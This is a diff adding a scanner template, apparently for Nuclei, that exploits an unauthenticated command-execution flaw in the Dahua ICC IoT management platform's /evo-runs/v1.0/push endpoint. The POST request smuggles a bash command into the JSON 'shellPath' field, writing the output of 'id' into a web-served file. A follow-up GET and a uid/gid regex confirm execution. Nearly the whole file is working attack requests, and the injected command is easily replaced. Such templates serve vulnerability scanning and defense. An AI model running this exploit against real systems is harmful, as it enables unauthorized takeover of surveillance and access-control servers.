@@ -1,0 +1,59 @@
+id: dahua-icc-push-rce
+info:
+  name: 大华智能物联网综合管理平台 push 命令执行漏洞
+  author: leadlife
+  severity: critical
+  description: 大华智能物联网综合管理平台（ICC）是一款以视频为核心的综合性物联网管理软件，专为企业和机构提供智能化、集中化的设备管理与数据整合服务。该平台通过集成视频监控、门禁控制、停车场管理、报警系统等子系统，实现对多品牌物联网设备的统一接入与管控，覆盖智慧社区、园区、工业场景等多种应用需求。该平台evo-runs/v1.0/push接口存在任意文件上传漏洞。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致远程代码执行或服务器被控制，严重威胁系统安全。
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483884&idx=1&sn=0949af9b1e47b7df86009546366987b1&chksm=9606e77ea1716e68e85f4d18de90c4dda8d5ca87a3da379281cc5b3ec60a6180321583acfe3c&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: rce,dahua,icc
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /evo-runs/v1.0/push HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/json
+        X-Subject-Headerflag: ADAPT
+        Content-Length: 301
+
+        {
+            "method": "agent.ossm.mapping.config",
+            "info": {
+                "configure": "cc",
+                "filePath": "cc",
+                "paramMap": {
+                    "shellPath": "/bin/bash -c id>/opt/evoWpms/static/{{filename}}.txt",
+                    "filePath": "cc"
+                },
+                "requestIp": ""
+            }
+        }
+      
+      - |+
+        GET /static/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+
+      - type: regex
+        part: body_2
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
